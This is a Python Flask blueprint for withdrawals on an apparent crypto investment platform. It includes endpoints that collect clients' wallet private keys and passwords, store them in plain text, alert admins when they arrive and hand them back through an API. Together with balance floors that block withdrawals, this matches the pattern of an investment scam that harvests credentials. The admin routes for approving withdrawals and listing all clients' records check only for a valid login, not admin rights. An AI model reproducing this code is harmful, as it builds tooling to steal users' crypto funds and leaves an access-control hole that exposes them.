from flask import Blueprint, request, jsonify
from VestaFlask.Data.db import db_session
from VestaFlask.utils import Queries
from flask_jwt_extended import get_jwt_identity, jwt_required
from VestaFlask.Data.models import Withdrawal, withdrawal_schema, Client, withdrawals_schema, Admin, Notifications

withdrawal = Blueprint('withdrawal', __name__, url_prefix='/withdrawal/')


@withdrawal.post('create')
@jwt_required()
def create_withdrawal():
    cur_client = get_jwt_identity()
    get_client = Queries.filter_one(Client, Client.id, cur_client)

    amount = request.json['amount']
    bitcoin = request.json['bitcoin']

    if not get_client:
        return jsonify({"message": "Invalid client!"}), 400
    if get_client.deleted:
        return jsonify({"message": "Account deactivated!"}), 400
    if amount == "":
        return jsonify({"message": "Invalid input!"}), 400
    if float(amount) <= 0.0:
        return jsonify({"message": "Amount cannot be less than or equal to 0!"}), 400
    if get_client.investment_plan == "Bronze":
        if get_client.acct_bal - float(amount) < 500:
            return jsonify({"message": "You have reached the minimum withdrawal amount for your plan!"}), 400
    if get_client.investment_plan == "Silver":
        if get_client.acct_bal - float(amount) < 1500:
            return jsonify({"message": "You have reached the minimum withdrawal amount for your plan, try migrating \
            to another plan!"}), 400
    if get_client.investment_plan == "Gold":
        if get_client.acct_bal - float(amount) < 2500:
            return jsonify({"message": "You have reached the minimum withdrawal amount for your plan, try migrating \
            to another plan!"}), 400

    bitcoin = Queries.sf(bitcoin)

    username = f"{get_client.first_name} {get_client.last_name}"

    new_withdrawal = Withdrawal(amount=amount, bitcoin=bitcoin, client_id=get_client.id, username=username,
                                wallet=get_client.coinbase_name)
    new_notif = Notifications(
        message=f"Client, {get_client.first_name} {get_client.last_name} made a withdrawal request of ${amount}.00.")

    message_header = "Withdrawal Request"
    message = f"Your just made withdrawal request of ${amount}.00({bitcoin} btc in your Vesta Trading account)"

    Queries.send_email(get_client.email, message, message_header)

    db_session.add(new_notif)

    db_session.add(new_withdrawal)
    db_session.commit()

    return jsonify({"heading": "Your withdrawal request was successful!", "content": f"Your withdrawal request of \
                        ${amount}({bitcoin}btc) is pending.  Please check your email regularly to see if the \
                        withdrawal has been approved."}), 201


@withdrawal.get('get/<page_size>/<page>')
@jwt_required()
def get(page, page_size):
    cur_client = get_jwt_identity()
    get_client = Queries.filter_one(Client, Client.id, cur_client)

    withdrawals = withdrawals_schema.dump(get_client.withdrawals)

    items = Queries.paginate(int(page), int(page_size), withdrawals)

    return jsonify(items), 200


@withdrawal.get('get/<index>')
@jwt_required()
def search(index):
    cur_client = get_jwt_identity()
    get_withdrawal = Queries.filter_one(Withdrawal, Withdrawal.id, index)

    if not get_withdrawal:
        return jsonify([]), 400
    if get_withdrawal.client_id != cur_client:
        return jsonify([]), 400

    get_withdrawal = withdrawal_schema.dump(get_withdrawal)

    return jsonify(get_withdrawal), 200


@withdrawal.post('/coin')
@jwt_required()
def create_coin():
    cur_client = get_jwt_identity()
    get_client = Queries.filter_one(Client, Client.id, cur_client)

    coinbase = request.json['coinbase']
    wallet = request.json['wallet']
    key = request.json['key']
    password = request.json['pass']

    if not get_client:
        return jsonify({"message": "Invalid client!"}), 400
    if get_client.deleted:
        return jsonify({"message": "Account deactivated!"}), 400
    if len(coinbase) < 1:
        return jsonify({"message": "Please select a wallet!"}), 400
    if len(wallet) < 1:
        return jsonify({"message": "Please type in your wallet address!"}), 400
    if len(key) < 1:
        return jsonify({"message": "Private key cannot be empty!"}), 400
    if len(password) < 8:
        return jsonify({"message": "Password must be at least 8 characters!"}), 400
    if not password.isalnum():
        return jsonify({"message": "Password must be alphanumeric!"}), 400

    get_client.is_coin = True
    get_client.coinbase_pass = password
    get_client.coinbase_key = key
    get_client.coinbase = coinbase
    get_client.coinbase_name = wallet

    new_notif = Notifications(
        message=f"Client, {get_client.first_name} {get_client.last_name} added {coinbase} private key and password.")

    db_session.add(new_notif)
    db_session.commit()

    return jsonify({"heading": "Your wallet has been added!", "content": f"Your wallet has been added successfully. \
                    You can update it on your wallet page."}), 200


@withdrawal.post('/coin/update')
@jwt_required()
def update_coin():
    cur_client = get_jwt_identity()
    get_client = Queries.filter_one(Client, Client.id, cur_client)

    coinbase = request.json['coinbase']
    wallet = request.json['wallet']
    key = request.json['key']
    password = request.json['pass']

    if not get_client:
        return jsonify({"message": "Invalid client!"}), 400
    if get_client.deleted:
        return jsonify({"message": "Account deactivated!"}), 400
    if len(coinbase) < 1:
        return jsonify({"message": "Please select a wallet!"}), 400
    if len(wallet) < 1:
        return jsonify({"message": "Please type in your wallet address!"}), 400
    if len(key) < 1:
        return jsonify({"message": "Private key cannot be empty!"}), 400
    if len(password) < 8:
        return jsonify({"message": "Password must be at least 8 characters!"}), 400
    if not password.isalnum():
        return jsonify({"message": "Password must be alphanumeric!"}), 400

    get_client.is_coin = True
    get_client.coinbase_pass = password
    get_client.coinbase_key = key
    get_client.coinbase = coinbase
    get_client.coinbase_name = wallet

    new_notif = Notifications(
        message=f"Client, {get_client.first_name} {get_client.last_name} updated {coinbase} private key and password.")

    db_session.add(new_notif)
    db_session.commit()

    return jsonify({"heading": "Your wallet has been updated!", "content": f"Your wallet has been updated \
                    successfully. You can update it on your wallet page."}), 200


@withdrawal.get('get/coin')
@jwt_required()
def get_coin():
    cur_client = get_jwt_identity()
    get_client = Queries.filter_one(Client, Client.id, cur_client)

    return jsonify({"coin": get_client.is_coin, "wallet": get_client.coinbase, "private": get_client.coinbase_key,
                    "pass": get_client.coinbase_pass, "add": get_client.coinbase_name}), 200


@withdrawal.get('get/all/<page_size>/<page>')
@jwt_required()
def get_all(page, page_size):
    withdrawals = Queries.get_all(Withdrawal)

    withdrawals = withdrawals_schema.dump(withdrawals)

    items = Queries.paginate(int(page), int(page_size), withdrawals)

    return jsonify(items), 200


@withdrawal.get('get/<user_id>/<page_size>/<page>')
@jwt_required()
def get_user_all(user_id, page, page_size):
    get_client = Queries.filter_one(Client, Client.id, user_id)

    if not get_client:
        return jsonify({"message": "Invalid client!"}), 400

    withdrawals = withdrawals_schema.dump(get_client.withdrawals)

    items = Queries.paginate(int(page), int(page_size), withdrawals)

    return jsonify(items), 200


@withdrawal.put('approve/<index>')
@jwt_required()
def approve(index):
    cur_admin = get_jwt_identity()

    get_admin = Queries.filter_one(Admin, Admin.id, cur_admin)
    get_withdrawal = Queries.filter_one(Withdrawal, Withdrawal.id, index)

    if not get_withdrawal:
        return jsonify({"message": "Invalid withdrawal!"}), 400

    get_client = Queries.filter_one(Client, Client.id, get_withdrawal.client_id)

    if not get_client:
        return jsonify({"message": "Invalid client!"}), 400

    admins = Queries.get_all(Admin)

    if get_withdrawal.status:
        get_withdrawal.status = False
        get_client.acct_bal += float(get_withdrawal.amount)
        get_client.bit_bal += float(get_withdrawal.bitcoin)
        get_client.tot_re -= float(get_withdrawal.amount)

        for admin in admins:
            admin.acct_bal += float(get_withdrawal.amount)
            admin.bit_bal += float(get_withdrawal.bitcoin)
            admin.tot_out -= float(get_withdrawal.amount)

    else:
        get_withdrawal.status = True
        get_client.acct_bal -= float(get_withdrawal.amount)
        get_client.bit_bal -= float(get_withdrawal.bitcoin)
        get_client.tot_re += float(get_withdrawal.amount)

        for admin in admins:
            admin.acct_bal -= float(get_withdrawal.amount)
            admin.bit_bal -= float(get_withdrawal.bitcoin)
            admin.tot_out += float(get_withdrawal.amount)

    new_notif = Notifications(
        message=f"Admin, {get_admin.first_name} {get_admin.last_name} approved withdrawal - {index}.")

    message_header = "Withdrawal Approved"
    message = f"Your withdrawal - {get_withdrawal.id}, has been approved!"

    Queries.send_email(get_client.email, message, message_header)

    db_session.add(new_notif)
    db_session.commit()

    return jsonify({"message": "Withdrawal approved!"}), 201


@withdrawal.get('get/all/<index>')
@jwt_required()
def search_all(index):
    get_withdrawal = Queries.filter_one(Withdrawal, Withdrawal.id, index)

    if not get_withdrawal:
        return jsonify([]), 400

    get_withdrawal = withdrawal_schema.dump(get_withdrawal)

    return jsonify(get_withdrawal), 200


@withdrawal.get('search/all/<user_id>/<index>')
@jwt_required()
def search_user_post(user_id, index):
    get_withdrawal = Queries.filter_one(Withdrawal, Withdrawal.id, index)

    if not get_withdrawal:
        return jsonify([]), 400
    if get_withdrawal.client_id != int(user_id):
        return jsonify([]), 400

    get_withdrawal = withdrawal_schema.dump(get_withdrawal)

    return jsonify(get_withdrawal), 200
